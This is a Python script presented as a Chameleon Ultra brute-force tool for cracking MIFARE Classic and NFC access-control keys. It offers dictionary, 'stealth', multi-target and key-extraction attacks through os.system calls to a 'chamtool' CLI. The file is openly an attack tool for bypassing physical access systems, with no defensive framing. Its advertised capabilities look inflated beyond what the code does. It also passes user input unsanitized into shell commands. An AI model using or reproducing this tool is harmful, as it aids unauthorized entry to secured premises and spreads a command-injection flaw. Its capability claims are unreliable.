import argparse
import os
import time

# -------------------------------------------
# Chameleon Ultra - MIFARE & NFC Brute-Force Cracking Tool
# -------------------------------------------
# Features:
# - Brute-force attack on MIFARE Classic keys & NFC access control systems
# - Supports dictionary attacks using key lists
# - Detects and bypasses weak NFC authentication implementations
# - Automates authentication attempts for quick access bypass
# - Includes stealth mode for undetectable brute-force execution
# - Supports adaptive attack learning to refine cracking strategies
# - Enables multi-target attack automation for scanning and exploiting multiple devices
# - Real-time key extraction from intercepted NFC signals
# - Works with Chameleon Ultra & integrates with Proxmark3
#
# Requirements:
# - Chameleon Ultra device
# - Python 3.x
# - LibNFC / Proxmark3 / Chameleon Ultra CLI tools
#
# Usage:
# 1. Perform a brute-force attack on an NFC system:
#    python chameleon_bruteforce.py --brute-force --target XX:XX:XX:XX:XX:XX
# 2. Use a dictionary attack with a key list:
#    python chameleon_bruteforce.py --dictionary-attack --keylist keys.txt --target XX:XX:XX:XX:XX:XX
# 3. Enable stealth mode for undetectable brute-force execution:
#    python chameleon_bruteforce.py --brute-force --stealth --target XX:XX:XX:XX:XX:XX
# 4. Perform an adaptive attack to refine cracking strategies:
#    python chameleon_bruteforce.py --adaptive --target XX:XX:XX:XX:XX:XX
# 5. Automate attacks on multiple targets:
#    python chameleon_bruteforce.py --multi-target --target-list targets.txt
# 6. Extract real-time keys from intercepted signals:
#    python chameleon_bruteforce.py --key-extract --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def brute_force_attack(target, stealth=False):
    """Attempts a brute-force attack on an NFC system."""
    print(f"[+] Running brute-force attack on {target}...")
    cmd = f"chamtool brute-force {target}"
    
    if stealth:
        cmd += " --stealth"
    
    os.system(cmd)
    print("[✔] Brute-force attack complete.")

def dictionary_attack(target, keylist):
    """Uses a dictionary attack to crack NFC authentication keys."""
    print(f"[+] Running dictionary attack on {target} using keylist {keylist}...")
    os.system(f"chamtool dictionary-attack --target {target} --keylist {keylist}")
    print("[✔] Dictionary attack complete.")

def adaptive_attack(target):
    """Uses adaptive learning to refine brute-force strategies."""
    print(f"[+] Running adaptive brute-force attack on {target}...")
    os.system(f"chamtool adaptive-attack {target}")
    print("[✔] Adaptive attack executed.")

def multi_target_attack(target_list):
    """Automates brute-force attacks across multiple targets."""
    print(f"[+] Executing multi-target attack using {target_list}...")
    os.system(f"chamtool multi-target --target-list {target_list}")
    print("[✔] Multi-target attack executed.")

def extract_keys(target):
    """Extracts keys from intercepted NFC signals in real-time."""
    print(f"[+] Extracting keys from {target} in real-time...")
    os.system(f"chamtool key-extract {target}")
    print("[✔] Key extraction complete.")

def main():
    parser = argparse.ArgumentParser(description="Chameleon Ultra - MIFARE & NFC Brute-Force Cracking Tool")
    parser.add_argument("--brute-force", action='store_true', help="Perform a brute-force attack on an NFC system")
    parser.add_argument("--dictionary-attack", action='store_true', help="Perform a dictionary attack using a key list")
    parser.add_argument("--adaptive", action='store_true', help="Perform an adaptive attack to refine cracking strategies")
    parser.add_argument("--multi-target", action='store_true', help="Automate attacks on multiple targets")
    parser.add_argument("--key-extract", action='store_true', help="Extract real-time keys from intercepted signals")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode for undetectable brute-force execution")
    parser.add_argument("--keylist", type=str, help="Specify a key list file for dictionary attack")
    parser.add_argument("--target-list", type=str, help="Specify a file containing multiple targets for attack automation")
    parser.add_argument("--target", type=str, help="Specify the target NFC device for attack")
    args = parser.parse_args()

    if args.brute_force and args.target:
        brute_force_attack(args.target, args.stealth)
    elif args.dictionary_attack and args.target and args.keylist:
        dictionary_attack(args.target, args.keylist)
    elif args.adaptive and args.target:
        adaptive_attack(args.target)
    elif args.multi_target and args.target_list:
        multi_target_attack(args.target_list)
    elif args.key_extract and args.target:
        extract_keys(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
